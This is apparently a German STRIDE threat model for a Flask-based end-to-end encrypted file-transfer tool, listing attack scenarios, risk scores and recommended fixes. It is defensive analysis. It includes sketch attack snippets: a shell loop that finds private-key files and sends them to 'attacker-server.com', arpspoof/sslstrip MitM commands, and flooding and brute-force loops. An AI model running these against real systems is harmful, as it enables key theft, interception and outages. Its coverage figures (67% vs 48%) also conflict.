# STRIDE Threat Model Analysis: RSA Hybrid FileCrypter
**Projekt:** RSA Hybrid FileCrypter - Ende-zu-Ende verschlüsselte Dateiübertragung  
**Version:** 2.0 (mit TLS und Input Validation)  
**Analysedatum:** 12. Februar 2026  
**Methodik:** STRIDE (Microsoft Threat Modeling Framework)

---

## 1. Executive Summary

Dieses Dokument analysiert das RSA Hybrid FileCrypter-System nach der **STRIDE-Methodik** (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).

**Gesamtergebnis:** 4 von 6 STRIDE-Kategorien **teilweise oder vollständig** mitigiert.

**Risiko-Score:** 🟠 **MEDIUM-HIGH** (67% Coverage)

**Hauptschwächen:**
- Denial of Service (kein Rate Limiting)
- Spoofing (Replay Attacks möglich)
- Repudiation (Lücken im Audit Logging)

---

## 2. Threat Modeling Scope

### 2.1 System-Komponenten
- **Server** (Flask REST API, Python 3.14)
- **Client** (CLI, Python 3.14)
- **Kommunikationskanal** (HTTPS/TLS mit self-signed Certs)
- **Storage** (In-Memory Dictionaries)
- **Kryptografie** (AES-256-GCM, RSA-4096, RSASSA-PSS)

### 2.2 Trust Boundaries
```
┌─────────────────────────────────────────────────┐
│              EXTERN (Untrusted)                  │
│  - Netzwerk (HTTPS)                             │
│  - Client-Eingaben (User-controlled)            │
└──────────────────┬──────────────────────────────┘
                   │ TLS Layer
                   ▼
┌─────────────────────────────────────────────────┐
│        SERVER (Partially Trusted)                │
│  - Input Validation                             │
│  - Authentication (UUID Signatures)             │
│  - Message Routing                              │
│  - NO decryption of payloads                    │
└──────────────────┬──────────────────────────────┘
                   │ Process Boundary
                   ▼
┌─────────────────────────────────────────────────┐
│         STORAGE (Trusted)                        │
│  - Client Registry (Alias, UUID, PubKey)        │
│  - Message Queue (Encrypted Payloads)           │
└─────────────────────────────────────────────────┘
```

### 2.3 Assets (Schutzziele)
| Asset | Confidentiality | Integrity | Availability |
|-------|----------------|-----------|--------------|
| Datei-Inhalt (Plaintext) | ✅ CRITICAL | ✅ CRITICAL | ⚠️ HIGH |
| Private Keys | ✅ CRITICAL | ✅ CRITICAL | ⚠️ MEDIUM |
| AES Session Keys | ✅ CRITICAL | ✅ CRITICAL | ⚠️ MEDIUM |
| Client-Identitäten | ⚠️ MEDIUM | ✅ HIGH | ⚠️ HIGH |
| Message Queue | ⚠️ LOW | ✅ HIGH | ❌ CRITICAL |
| Server Availability | - | - | ❌ CRITICAL |

---

## 3. STRIDE-Analyse

### 3.1 **S** - Spoofing (Identity Forgery)
**Definition:** Angreifer gibt sich als legitimer User aus.

#### 3.1.1 Bedrohungsszenarien

##### Szenario S1: Client Identity Spoofing via UUID Replay
**Beschreibung:**  
Ein Angreifer fängt eine gültige `proof_signature` eines legitimen Clients ab und verwendet sie beliebig oft wieder.

**Angriffspfad:**
```python
# 1) Angreifer fängt legitimen Request ab (Netzwerk-Sniffing)
legitimate_request = {
    "from_alias": "Client1",
    "proof_signature": "a1b2c3d4e5..."  # Gültige Signatur
}

# 2) Angreifer replayed diese Signatur
for i in range(1000):
    requests.post("/request_partner", json={
        "from_alias": "Client1",
        "partner_alias": "Client2",
        "proof_signature": "a1b2c3d4e5..."  # REPLAY!
    })
    # Server akzeptiert, weil Signatur technisch korrekt ist
```

**Impact:**
- ✅ Unbefugter Zugriff auf Partner Public Keys
- ✅ Senden von Nachrichten im Namen anderer
- ✅ Abrufen fremder Inbox-Inhalte

**Wahrscheinlichkeit:** 🔴 **HIGH** (bei aktivem Angreifer im Netzwerk)

**Aktuelle Mitigations:**
- ✅ RSASSA-PSS Signature Verification
- ❌ **KEINE** Nonce/Timestamp-basierte Challenge
- ❌ **KEINE** Token Expiry
- ❌ **KEINE** Replay Detection

**Remediation-Status:** ❌ **NICHT MITIGIERT**

**Empfohlene Fixes:**
1. Challenge-Response mit einmaligen Nonces
2. Timestamp in Signatur + Server-seitige Time-Window-Validierung
3. Session Tokens mit Expiry (JWT)

---

##### Szenario S2: Alias Hijacking (Client Registration)
**Beschreibung:**  
Ein Angreifer registriert sich mit einem bereits vergebenen Alias, bevor der legitime Owner das tun kann.

**Angriffspfad:**
```python
# Angreifer kennt Alias-Namen von Ziel (z.B. durch Social Engineering)
target_alias = "CEO"

# Race Condition: Angreifer registriert zuerst
attacker_priv = generate_rsa_private()
requests.post("/register", json={
    "alias": target_alias,  # Hijacking!
    "uuid": attacker_uuid,
    "pubkey_pem": attacker_pub,
    "uuid_signature": valid_sig
})
# → Angreifer erhält alle messages für "CEO"
```

**Impact:**
- ✅ Nachrichten-Interception
- ✅ Identity Theft
- ⚠️ Denial of Service (echter Client kann sich nicht registrieren)

**Wahrscheinlichkeit:** 🟡 **MEDIUM** (erfordert Race Condition)

**Aktuelle Mitigations:**
- ✅ Duplicate Alias Check: `if STORE.get_client_by_alias(alias): return 409`
- ⚠️ **ABER:** First-Come-First-Served (kein Reservierungssystem)
- ❌ Keine Client-Verifizierung (Email, Phone, etc.)

**Remediation-Status:** ⚠️ **TEILWEISE MITIGIERT**

**Empfohlene Fixes:**
1. Alias-Reservierung mit Out-of-Band-Verifizierung
2. Admin-Approval für sensible Alias-Namen
3. Namespace-basierte Aliases (z.B. `org1.client1`)

---

##### Szenario S3: Man-in-the-Middle (TLS)
**Beschreibung:**  
Bei deaktivierter TLS-Validierung (`--no-verify-ssl`) kann ein MitM-Angreifer eigenes Zertifikat präsentieren.

**Angriffspfad:**
```bash
# Angreifer im selben Netzwerk
sudo arpspoof -t 192.168.1.100 192.168.1.1
sudo sslstrip -l 5000

# Oder: Eigener HTTPS-Proxy mit gültigem self-signed Cert
# Client akzeptiert wegen verify=False
```

**Impact:**
- ✅ Vollständige TLS-Bypass
- ✅ Plaintextzugriff auf alle Kommunikation
- ❌ **ABER:** Payloads sind weiterhin E2E-verschlüsselt!

**Wahrscheinlichkeit:** 🟡 **MEDIUM** (erfordert Netzwerkzugang)

**Aktuelle Mitigations:**
- ✅ TLS vorhanden
- ✅ E2E-Verschlüsselung (Payloads)
- ❌ Certificate Validation deaktiviert

**Remediation-Status:** ⚠️ **TEILWEISE MITIGIERT**

**Empfohlene Fixes:**
1. Certificate Pinning
2. Let's Encrypt für Production
3. Warnung bei `--no-verify-ssl` verstärken

---

#### 3.1.2 Spoofing - Zusammenfassung
| Bedrohung | Likelihood | Impact | Mitigiert? | Priority |
|-----------|-----------|--------|------------|----------|
| UUID Replay | HIGH | HIGH | ❌ NO | 🔴 P0 |
| Alias Hijacking | MEDIUM | HIGH | ⚠️ PARTIAL | 🟡 P1 |
| MitM (TLS) | MEDIUM | MEDIUM | ⚠️ PARTIAL | 🟡 P1 |

**Spoofing Score:** ⚠️ **3/10 Punkte** (nur grundlegende Mitigations)

---

### 3.2 **T** - Tampering (Data Modification)
**Definition:** Angreifer modifiziert Daten in Transit oder at Rest.

#### 3.2.1 Bedrohungsszenarien

##### Szenario T1: Payload Manipulation in Transit
**Beschreibung:**  
Angreifer versucht, verschlüsselte Payloads während der Übertragung zu modifizieren.

**Angriffspfad:**
```python
# Angreifer intercepted Message
message = {
    "payload": {
        "enc_key_b64": "...",
        "nonce": "...",
        "ciphertext": "AAABBBCCC..."  # 16 MB Base64
    }
}

# Attacke: Flip random bit
message["payload"]["ciphertext"] = flip_bit(message["payload"]["ciphertext"])

# Wird beim Empfänger erkannt?
```

**Impact:**
- ❌ Modifikation wird **erkannt** durch AES-GCM Auth Tag
- ✅ Decryption schlägt fehl mit `InvalidTag` Exception
- ✅ **Integrity geschützt**

**Wahrscheinlichkeit:** 🟡 **MEDIUM** (trivial durchzuführen)

**Aktuelle Mitigations:**
- ✅ **AES-GCM** mit 128-bit Authentication Tag
- ✅ AAD bindet Sender-Alias an Payload
- ✅ Exception Handling bei InvalidTag

**Remediation-Status:** ✅ **VOLLSTÄNDIG MITIGIERT**

---

##### Szenario T2: Metadata Manipulation
**Beschreibung:**  
Angreifer ändert Metadaten (Filename, Recipient) ohne Payload zu modifizieren.

**Angriffspfad:**
```python
# Original Message
message = {
    "from_alias": "Client1",
    "to_alias": "Client2",
    "meta": {"filename": "secret.txt"},
    "payload": {...}  # AAD-geschützt: nur from_alias
}

# Angreifer ändert
message["to_alias"] = "Client3"  # Relay Attack!
message["meta"]["filename"] = "virus.exe"  # Social Engineering

# Wird erkannt?
```

**Impact:**
- ⚠️ `to_alias` **NICHT** AAD-geschützt → änderbar
- ⚠️ `filename` **NICHT** AAD-geschützt → änderbar
- ❌ Recipient erhält Message unter falschem Namen

**Wahrscheinlichkeit:** 🟡 **MEDIUM**

**Aktuelle Mitigations:**
- ✅ AAD schützt `from_alias`
- ❌ AAD schützt NICHT `to_alias`, `filename`, `timestamp`
- ⚠️ Filename Sanitization am Client vorhanden

**Remediation-Status:** ⚠️ **TEILWEISE MITIGIERT**

**Empfohlene Fixes:**
```python
# Umfassendes AAD
aad = json.dumps({
    "from": from_alias,
    "to": to_alias,
    "file": filename,
    "ts": timestamp
}, sort_keys=True).encode()
```

---

##### Szenario T3: Storage Manipulation
**Beschreibung:**  
Angreifer mit Server-Zugriff modifiziert In-Memory Storage.

**Angriffspfad:**
```python
# Angreifer hat Code-Execution auf Server (z.B. RCE via Debug Console)
from server.storage import STORE

# Manipulation
STORE.clients_by_alias["Admin"] = Client(
    alias="Admin",
    uuid="attacker-uuid",
    pubkey_pem=attacker_pubkey
)

# Oder: Messages stehlen
stolen = STORE.inbox["CEO"]
```

**Impact:**
- ✅ Vollständige Kontrolle über Registry
- ✅ Message Theft
- ⚠️ **ABER:** Payloads bleiben verschlüsselt (kein Plaintext-Zugriff)

**Wahrscheinlichkeit:** 🟢 **LOW** (erfordert Server-Kompromittierung)

**Aktuelle Mitigations:**
- ✅ E2E-Verschlüsselung (Payloads)
- ❌ Kein Integrity-Check auf Storage-Ebene
- ❌ Kein Read-Only-Modus

**Remediation-Status:** ⚠️ **TEILWEISE MITIGIERT**

**Empfohlene Fixes:**
1. Signed Storage Records (Merkle Tree)
2. Separate Read/Write Permissions
3. Append-Only Logs für Audit Trail

---

#### 3.2.2 Tampering - Zusammenfassung
| Bedrohung | Likelihood | Impact | Mitigiert? | Priority |
|-----------|-----------|--------|------------|----------|
| Payload Modification | MEDIUM | LOW | ✅ YES | - |
| Metadata Manipulation | MEDIUM | MEDIUM | ⚠️ PARTIAL | 🟡 P1 |
| Storage Tampering | LOW | HIGH | ⚠️ PARTIAL | 🟢 P2 |

**Tampering Score:** ✅ **7/10 Punkte** (gute Crypto-Schutzmechanismen)

---

### 3.3 **R** - Repudiation (Non-Attribution)
**Definition:** User kann Aktionen abstreiten (fehlender Audit Trail).

#### 3.3.1 Bedrohungsszenarien

##### Szenario R1: Message Sending Denial
**Beschreibung:**  
Sender behauptet, eine Nachricht nie geschickt zu haben.

**Angriffspfad:**
```
Client1: "Ich habe die vertrauliche Datei NIE an Client2 geschickt!"
Server Log: <keine detaillierten Logs vorhanden>
Forensics: <keine digitale Signatur auf Message-Level>
```

**Impact:**
- ⚠️ Dispute Resolution schwierig
- ⚠️ Compliance-Probleme (GDPR, SOX, etc.)

**Wahrscheinlichkeit:** 🟡 **MEDIUM**

**Aktuelle Mitigations:**
- ✅ UUID-Signatur bei `/deliver` (beweist Sender-Authentizität)
- ⚠️ Server-Logs vorhanden, aber **unvollständig**:
  - ✅ Registration geloggt
  - ❌ Message-Delivery **nicht detailliert** geloggt
  - ❌ Kein Timestamp im Payload
  - ❌ Keine Client-IP-Logging

**Remediation-Status:** ⚠️ **TEILWEISE MITIGIERT**

**Empfohlene Fixes:**
```python
# server/app.py
@app.post("/deliver")
def deliver():
    sec_log.log_event('message_delivered', 
                      from_alias=fr, 
                      to_alias=to,
                      timestamp=time.time(),
                      ip=request.remote_addr,
                      payload_hash=hashlib.sha256(json.dumps(payload).encode()).hexdigest(),
                      signature=proof)
```

---

##### Szenario R2: Key Request Denial
**Beschreibung:**  
Client behauptet, nie einen Public Key angefragt zu haben.

**Angriffspfad:**
```
Client1: "Ich habe NIE den Key von Client2 angefragt - jemand hat meinen Account gehackt!"
Server: <keine Logs für /request_partner>
```

**Impact:**
- ⚠️ Insider-Threat Detection erschwert
- ⚠️ Compliance Audit Failures

**Wahrscheinlichkeit:** 🟢 **LOW-MEDIUM**

**Aktuelle Mitigations:**
- ❌ **KEIN** Logging von `/request_partner` Calls
- ❌ Keine IP-Adressen
- ❌ Keine User-Agent Strings

**Remediation-Status:** ❌ **NICHT MITIGIERT**

---

##### Szenario R3: Registration Manipulation
**Beschreibung:**  
Angreifer registriert Account, führt Angriff durch, löscht Spuren.

**Angriffspfad:**
```python
# Angreifer registriert
requests.post("/register", json={...})

# Führt Angriff durch
requests.post("/deliver", json={...})

# Server restart → In-Memory Storage gelöscht
# Forensics: <keine Spuren>
```

**Impact:**
- ✅ Attribution unmöglich
- ✅ Forensic Investigation blockiert

**Wahrscheinlichkeit:** 🟡 **MEDIUM** (wegen In-Memory Storage)

**Aktuelle Mitigations:**
- ⚠️ Registration wird geloggt
- ❌ **ABER:** Logs in Memory (verloren bei Restart)
- ❌ Keine persistent Logs

**Remediation-Status:** ⚠️ **TEILWEISE MITIGIERT**

---

#### 3.3.2 Repudiation - Zusammenfassung
| Bedrohung | Likelihood | Impact | Mitigiert? | Priority |
|-----------|-----------|--------|------------|----------|
| Message Sending Denial | MEDIUM | MEDIUM | ⚠️ PARTIAL | 🟡 P1 |
| Key Request Denial | LOW | MEDIUM | ❌ NO | 🟡 P1 |
| Registration Manipulation | MEDIUM | HIGH | ⚠️ PARTIAL | 🟠 P1 |

**Repudiation Score:** ⚠️ **4/10 Punkte** (erhebliche Logging-Lücken)

---

### 3.4 **I** - Information Disclosure (Data Leakage)
**Definition:** Unbefugter Zugriff auf sensible Informationen.

#### 3.4.1 Bedrohungsszenarien

##### Szenario I1: Plaintext File Access (E2E Bypass)
**Beschreibung:**  
Angreifer versucht, Dateien im Klartext zu lesen.

**Angriffspfad:**
```
1) Server Compromise → Zugriff auf Message Queue
2) Netzwerk Sniffing → Abfangen von HTTPS-Traffic
3) Client-Seitig → Filesystem-Zugriff auf empfangene Dateien
```

**Impact:**
- ✅ **Server:** Nur Ciphertext gespeichert (keine Plaintexts)
- ✅ **Netzwerk:** TLS + E2E-Verschlüsselung
- ⚠️ **Client:** Empfangene Dateien im Klartext

**Wahrscheinlichkeit:** 🟢 **LOW** (erfordert Multi-Point-Compromise)

**Aktuelle Mitigations:**
- ✅ **AES-256-GCM** für Payloads
- ✅ **RSA-OAEP-4096** für Key-Transport
- ✅ TLS für Transport
- ⚠️ Client-Side: Normale Filesystem-Rechte (600-644)

**Remediation-Status:** ✅ **WEITGEHEND MITIGIERT**

**Empfohlene Verbesserungen:**
- Encrypted Filesystem (eCryptfs, LUKS)
- Automatisches Shredding nach Lesen
- Permission Enforcement (chmod 600)

---

##### Szenario I2: Private Key Theft
**Beschreibung:**  
Angreifer stiehlt Private Keys vom Client-Dateisystem.

**Angriffspfad:**
```bash
# Malware auf Client-Rechner
find /home -name "*_priv.pem" 2>/dev/null | while read key; do
    exfiltrate $key attacker-server.com
done
```

**Impact:**
- ✅ Vollständiger Identity-Takeover
- ✅ Decrypt aller vergangenen Messages (wenn abgefangen)
- ✅ Senden von Messages im Namen des Opfers

**Wahrscheinlichkeit:** 🟡 **MEDIUM** (Standard-Malware-Vektor)

**Aktuelle Mitigations:**
- ❌ **KEINE** Passwort-Verschlüsselung der Keys
- ⚠️ Normale Filesystem-Rechte

**Remediation-Status:** ❌ **UNZUREICHEND MITIGIERT**

**Empfohlene Fixes:**
```python
# Password-protected Keys
encryption = serialization.BestAvailableEncryption(password.encode())
# Oder: OS Keychain Integration
```

---

##### Szenario I3: Metadata Leakage
**Beschreibung:**  
Angreifer analysiert Metadaten (wer kommuniziert mit wem, wann, wie oft).

**Angriffspfad:**
```python
# Passive Network Observation
for packet in sniff(https_traffic):
    log(source_ip, dest_ip, timestamp, packet_size)
    
# Traffic Analysis
# "Client1 sendet alle 5 Minuten 5MB an Client2"
# → Rückschluss auf Kommunikationsmuster
```

**Impact:**
- ⚠️ Traffic Analysis möglich
- ⚠️ Kommunikationspartner identifizierbar
- ⚠️ Timing Leakage

**Wahrscheinlichkeit:** 🟡 **MEDIUM**

**Aktuelle Mitigations:**
- ✅ TLS verschleiert Payload-Größen (teilweise)
- ❌ **KEINE** Traffic Padding
- ❌ **KEINE** Dummy-Messages
- ❌ **KEINE** Timing Obfuscation

**Remediation-Status:** ⚠️ **MINIMAL MITIGIERT**

**Empfohlene Verbesserungen:**
- Padding auf Fixed-Size Messages
- Dummy Traffic Generation
- Onion Routing (z.B. Tor Integration)

---

##### Szenario I4: Stack Trace Information Disclosure
**Beschreibung:**  
Debug Mode sendet Full Stack Traces an Client.

**Angriffspfad:**
```python
# Attacker triggert Exception
requests.post("/deliver", json={"invalid": True})

# Server Response (Debug Mode):
{
    "error": "ValidationError: ...",
    "traceback": """
        File "/home/user/project/server/app.py", line 123
        File "/home/user/project/server/validation.py", line 45
        ...
    """
}
```

**Impact:**
- ✅ File Paths offengelegt
- ✅ Library Versions erkennbar
- ⚠️ Potential Code Snippets in Trace

**Wahrscheinlichkeit:** 🟢 **LOW** (nur wenn Debug aktiv)

**Aktuelle Mitigations:**
- ⚠️ Debug Mode **ist aktiv** in `app.py`
- ✅ Exception Handling vorhanden

**Remediation-Status:** ⚠️ **BEI PRODUCTION KRITISCH**

**Fix:** `debug=False` in Production

---

#### 3.4.2 Information Disclosure - Zusammenfassung
| Bedrohung | Likelihood | Impact | Mitigiert? | Priority |
|-----------|-----------|--------|------------|----------|
| Plaintext File Access | LOW | CRITICAL | ✅ YES | - |
| Private Key Theft | MEDIUM | CRITICAL | ❌ NO | 🔴 P0 |
| Metadata Leakage | MEDIUM | MEDIUM | ⚠️ MINIMAL | 🟢 P2 |
| Stack Trace Disclosure | LOW | LOW | ⚠️ PARTIAL | 🟡 P1 |

**Information Disclosure Score:** ⚠️ **6/10 Punkte** (Crypto gut, Keys anfällig)

---

### 3.5 **D** - Denial of Service (Availability Attacks)
**Definition:** Angreifer macht Service unbenutzbar.

#### 3.5.1 Bedrohungsszenarien

##### Szenario D1: Registration Flooding
**Beschreibung:**  
Angreifer registriert massenhaft Clients bis Server-RAM erschöpft ist.

**Angriffspfad:**
```python
import multiprocessing

def register_spam():
    while True:
        priv = generate_rsa_private()  # 200 KB/Key
        requests.post("/register", json={
            "alias": f"bot_{random.randint(1, 999999)}",
            ...
        })

# 10,000 Registrations = 2 GB RAM
with multiprocessing.Pool(100) as pool:
    pool.map(register_spam, range(100))
```

**Impact:**
- ✅ Memory Exhaustion → OOM Kill
- ✅ Server Crash
- ⚠️ CPU Exhaustion (RSA Signature Verification)

**Wahrscheinlichkeit:** 🔴 **HIGH** (trivial durchführbar)

**Aktuelle Mitigations:**
- ❌ **KEIN** Rate Limiting auf `/register`
- ❌ **KEINE** Client-Limit (unbegrenzt viele Registrations)
- ❌ **KEINE** CAPTCHA oder Proof-of-Work

**Remediation-Status:** ❌ **NICHT MITIGIERT - KRITISCH**

**Empfohlene Fixes:**
```python
@app.post("/register")
@limiter.limit("5 per hour")  # Flask-Limiter
def register():
    if len(STORE.clients_by_alias) >= 1000:  # Global Limit
        return jsonify({"error": "server_full"}), 503
    ...
```

---

##### Szenario D2: Message Queue Flooding
**Beschreibung:**  
Angreifer sendet massenhaft Messages bis Queue voll ist.

**Angriffspfad:**
```python
# Attacker registriert
attacker_priv = generate_rsa_private()
register_client("Victim")
register_client("Attacker")

# Spam
while True:
    requests.post("/deliver", json={
        "from_alias": "Attacker",
        "to_alias": "Victim",
        "payload": {
            "ciphertext": "x" * 20_000_000  # 20 MB
        }
    })

# 100 Messages = 2 GB RAM!
```

**Impact:**
- ✅ Victim's Inbox blockiert
- ✅ Server RAM Exhaustion
- ⚠️ Andere Clients betroffen (Shared Memory)

**Wahrscheinlichkeit:** 🔴 **HIGH**

**Aktuelle Mitigations:**
- ✅ Payload Size Limit: 20 MB
- ❌ **KEINE** Messages-per-Client Limit
- ❌ **KEIN** Rate Limiting auf `/deliver`

**Remediation-Status:** ❌ **UNZUREICHEND MITIGIERT**

**Empfohlene Fixes:**
```python
MAX_MESSAGES_PER_CLIENT = 100

def enqueue(self, msg: Message):
    if len(self.inbox.get(msg.to_alias, [])) >= MAX_MESSAGES_PER_CLIENT:
        raise ValueError("Inbox full - max 100 messages")
    ...
```

---

##### Szenario D3: Cryptographic Exhaustion
**Beschreibung:**  
Angreifer zwingt Server zu teuren Crypto-Operationen.

**Angriffspfad:**
```python
# RSA-4096 Signature Verification: ~40ms pro Operation
# Ziel: Server-CPU auf 100% halten

for _ in range(10000):
    requests.post("/request_partner", json={
        "from_alias": "Attacker",
        "partner_alias": "Victim",
        "proof_signature": generate_fake_signature()
    })
    # Jeder Request → 40ms CPU → 25 Requests/Sekunde
    # 100 Concurrent Connections → 100% CPU
```

**Impact:**
- ✅ CPU Exhaustion
- ⚠️ Legitimate Requests verzögert
- ⚠️ Timeout-Errors

**Wahrscheinlichkeit:** 🟡 **MEDIUM** (erfordert viele Connections)

**Aktuelle Mitigations:**
- ❌ **KEIN** Rate Limiting
- ⚠️ Python GIL limitiert Parallelität (teilweise Schutz)

**Remediation-Status:** ❌ **NICHT MITIGIERT**

---

##### Szenario D4: In-Memory Storage - Data Loss
**Beschreibung:**  
Server Restart führt zu totalem Datenverlust.

**Angriffspfad:**
```bash
# Absichtlicher Crash
kill -9 $(pgrep python)

# Oder: Memory Exhaustion führt zu OOM Kill
# → Alle Registrations, alle Messages: VERLOREN
```

**Impact:**
- ✅ **TOTALER DATENVERLUST**
- ✅ Clients müssen neu registrieren
- ✅ Pending Messages verloren

**Wahrscheinlichkeit:** 🟡 **MEDIUM** (bei jedem Restart)

**Aktuelle Mitigations:**
- ❌ **KEINE** Persistenz
- ❌ **KEINE** Backup-Strategie

**Remediation-Status:** ❌ **NICHT MITIGIERT - KRITISCH**

---

#### 3.5.2 Denial of Service - Zusammenfassung
| Bedrohung | Likelihood | Impact | Mitigiert? | Priority |
|-----------|-----------|--------|------------|----------|
| Registration Flooding | HIGH | CRITICAL | ❌ NO | 🔴 P0 |
| Message Queue Flooding | HIGH | HIGH | ⚠️ PARTIAL | 🔴 P0 |
| Cryptographic Exhaustion | MEDIUM | MEDIUM | ❌ NO | 🟡 P1 |
| Data Loss on Restart | MEDIUM | HIGH | ❌ NO | 🟡 P1 |

**Denial of Service Score:** ❌ **1/10 Punkte** (kritische Schwäche!)

---

### 3.6 **E** - Elevation of Privilege (Privilege Escalation)
**Definition:** Angreifer erhält höhere Zugriffsrechte.

#### 3.6.1 Bedrohungsszenarien

##### Szenario E1: Admin Endpoint Exposure
**Beschreibung:**  
Versteckte Admin-Endpoints ohne Authentication.

**Angriffspfad:**
```python
# Suche nach undokumentierten Endpoints
for path in ["/admin", "/debug", "/internal", "/status"]:
    response = requests.get(f"https://server:5000{path}")
    if response.status_code != 404:
        print(f"Found: {path}")
```

**Impact:**
- ⚠️ Potentiell Admin-Funktionen erreichbar

**Wahrscheinlichkeit:** 🟢 **LOW**

**Aktuelle Mitigations:**
- ✅ **KEINE** Admin-Endpoints vorhanden
- ✅ Nur öffentliche API-Endpoints

**Remediation-Status:** ✅ **NICHT ANWENDBAR**

---

##### Szenario E2: Werkzeug Debugger Remote Code Execution
**Beschreibung:**  
Bei aktivem Debug Mode: Debugger PIN erraten → RCE.

**Angriffspfad:**
```python
# Debugger PIN ist deterministisch generiert aus:
# - MAC Address
# - Machine ID
# - Boot ID
# → Mit genug Info über Server: PIN berechenbar

# Oder: Brute Force (6-stellige PIN = 1 Million Möglichkeiten)
for pin in range(000000, 999999):
    test_debugger_pin(pin)
```

**Impact:**
- ✅ **VOLLSTÄNDIGE SERVER-KONTROLLE**
- ✅ Remote Code Execution
- ✅ Filesystem-Zugriff

**Wahrscheinlichkeit:** 🟢 **LOW** (wenn Debug Mode disabled)  
**Wahrscheinlichkeit:** 🔴 **HIGH** (wenn Debug Mode enabled)

**Aktuelle Mitigations:**
- ⚠️ Debug Mode **IST AKTIV** in Code
- ❌ Configuration-Management fehlt

**Remediation-Status:** ⚠️ **KRITISCH BEI PRODUCTION**

**Fix:** `debug=False` + Umgebungsvariable

---

##### Szenario E3: Cross-Client Data Access
**Beschreibung:**  
Ein Client kann Messages anderer Clients lesen.

**Angriffspfad:**
```python
# Client1 versucht, Client2's Inbox zu lesen
requests.get("/inbox/Client2", headers={
    "X-Proof": client1_proof  # Client1's Signature
})
```

**Impact:**
- ❌ Wird **blockiert**: Proof muss zu Alias passen

**Wahrscheinlichkeit:** 🟢 **LOW**

**Aktuelle Mitigations:**
- ✅ `/inbox/<alias>` validiert Proof gegen Alias
- ✅ Cross-Account-Access verhindert

**Remediation-Status:** ✅ **VOLLSTÄNDIG MITIGIERT**

---

#### 3.6.2 Elevation of Privilege - Zusammenfassung
| Bedrohung | Likelihood | Impact | Mitigiert? | Priority |
|-----------|-----------|--------|------------|----------|
| Admin Endpoint Exposure | LOW | HIGH | ✅ N/A | - |
| Debugger RCE | HIGH (dev) | CRITICAL | ⚠️ PARTIAL | 🔴 P0 |
| Cross-Client Access | LOW | HIGH | ✅ YES | - |

**Elevation of Privilege Score:** ✅ **8/10 Punkte** (gut, außer Debug Mode)

---

## 4. STRIDE Scoring Matrix

| STRIDE-Kategorie | Mitigations | Score | Status |
|------------------|------------|-------|--------|
| **Spoofing** | UUID-Sig, Duplicate Check | 3/10 | ⚠️ PARTIAL |
| **Tampering** | AES-GCM, AAD | 7/10 | ✅ GOOD |
| **Repudiation** | Basic Logging | 4/10 | ⚠️ GAPS |
| **Information Disclosure** | E2E Encryption | 6/10 | ⚠️ PARTIAL |
| **Denial of Service** | Payload Limits | 1/10 | ❌ CRITICAL |
| **Elevation of Privilege** | No Admin Functions | 8/10 | ✅ GOOD |

**Gesamtscore:** **29/60 Punkte** = **48%** Coverage

---

## 5. Risk Priorisierung

### 🔴 CRITICAL (P0) - Immediate Action
1. **Denial of Service** - Rate Limiting implementieren
2. **Spoofing** - Replay Attack Prevention (Nonce-System)
3. **Information Disclosure** - Key Encryption
4. **Elevation** - Debug Mode disablen

**Effort:** ~1-2 Wochen  
**Risk Reduction:** 80%

---

### 🟡 HIGH (P1) - Address Before Production
5. **Repudiation** - Comprehensive Audit Logging
6. **Tampering** - AAD Enhancement (to_alias, filename)
7. **DoS** - Persistent Storage (SQLite)

**Effort:** ~2-3 Wochen  
**Risk Reduction:** 15%

---

### 🟢 MEDIUM (P2) - Nice-to-Have
8. **Information Disclosure** - Metadata Obfuscation
9. **Spoofing** - Certificate Pinning

**Effort:** ~1 Woche  
**Risk Reduction:** 5%

---

## 6. Empfohlene Mitigations

### Quick Wins (1-2 Tage)
```python
# 1) Debug Mode disablen
debug = os.environ.get('FLASK_ENV') == 'development'

# 2) Basic Rate Limiting
@limiter.limit("100 per hour")

# 3) Message Queue Limits
MAX_MESSAGES_PER_CLIENT = 100

# 4) Private Key Permissions
os.chmod(priv_key_file, 0o600)
```

### Medium-Term (1-2 Wochen)
```python
# 1) Nonce-based Auth
@app.post("/participate")
def participate():
    nonce = secrets.token_urlsafe(32)
    challenge = Challenge(uuid, nonce, time.time())
    return jsonify({"uuid": uuid, "nonce": nonce})

# 2) Comprehensive Logging
sec_log.log_event('http_request', 
                  ip=request.remote_addr, 
                  method=request.method,
                  endpoint=request.path)

# 3) Enhanced AAD
aad = json.dumps({
    "from": from_alias,
    "to": to_alias,
    "file": filename,
    "ts": timestamp
}).encode()
```

### Long-Term (4+ Wochen)
```python
# 1) SQLite Persistence
class PersistentStore:
    def __init__(self, db="server.db"):
        self.db = sqlite3.connect(db)

# 2) Redis für High-Performance
redis_client = redis.Redis(host='localhost', port=6379)

# 3) JWT Tokens
access_token = jwt.encode({
    'sub': client_uuid,
    'exp': time.time() + 3600
}, SECRET_KEY)
```

---

## 7. Monitoring & Detection

### Key Metrics
```python
# Rate Limiting Violations
alert if requests_per_minute > 100

# Failed Auth Attempts
alert if failed_auth_count > 5 per IP per hour

# Memory Usage
alert if ram_usage > 80%

# Large Message Queue
alert if inbox_size > 50 per client
```

### SIEM Integration
```json
{
  "event": "auth_failure",
  "timestamp": 1707772800,
  "ip": "192.168.1.100",
  "alias": "Client1",
  "reason": "invalid_signature"
}
```

---

## 8. Zusammenfassung

### Stärken ✅
- Exzellente Kryptografie (AES-256-GCM, RSA-4096)
- Grundlegende Input Validation
- TLS-Implementierung
- Keine Admin-Privilegien

### Schwächen ❌
- **Denial of Service** - Keine Rate Limits
- **Spoofing** - Replay Attacks möglich
- **Repudiation** - Unvollständiges Logging
- **Information Disclosure** - Keys ungeschützt

### Gesamtbewertung
**Für Prototyp:** ✅ Akzeptabel (mit Einschränkungen)  
**Für Production:** ❌ Nicht bereit (kritische Lücken)

**Empfohlene Timeline:** 4-6 Wochen Hardening vor Production-Deployment

---

**Erstellt:** 12. Februar 2026  
**Review:** Nach Implementierung P0-Fixes  
**Nächster Threat Model Review:** Q2 2026
